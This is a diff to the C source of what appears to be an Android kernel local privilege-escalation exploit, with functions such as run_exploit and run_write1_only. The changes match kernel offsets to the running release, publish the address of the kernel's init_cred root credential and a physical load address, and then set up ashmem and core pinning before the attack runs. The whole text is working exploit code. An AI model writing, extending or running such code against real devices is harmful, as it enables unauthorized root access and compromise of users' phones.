@@ -84,6 +84,15 @@ static int select_offsets(void) {
     if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
       active_offsets = &known_offsets[i];
       pr_success("offsets matched: %s\n", active_offsets->uname_r);
+      /* Publish per-device symbol addresses that other TUs need. INIT_CRED
+       * here expands via the redefined INIT_CRED_OFF above, i.e. the runtime
+       * table entry rather than target.h's compile-time constant. */
+      g_init_cred_image = INIT_CRED;
+      if (active_offsets->kernel_phys_load) {
+        p0_kernel_phys_load = active_offsets->kernel_phys_load;
+      }
+      pr_info("init_cred image=%016zx alias=%016zx\n",
+              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
       return 0;
     }
   }
@@ -428,6 +437,7 @@ int run_exploit(int argc, char **argv) {
   if (!active_offsets && select_offsets() < 0) return 1;
 
   log_startup_context();
+  init_p0_profile();
   init_ashmem_path();
   pin_to_core(CORE);
 
@@ -580,6 +590,7 @@ static int run_write1_only(void) {
   set_unbuffer();
   set_limit();
   if (!active_offsets && select_offsets() < 0) return 1;
+  init_p0_profile();
   init_ashmem_path();
   pin_to_core(CORE);
   kaslr_slide = 0;
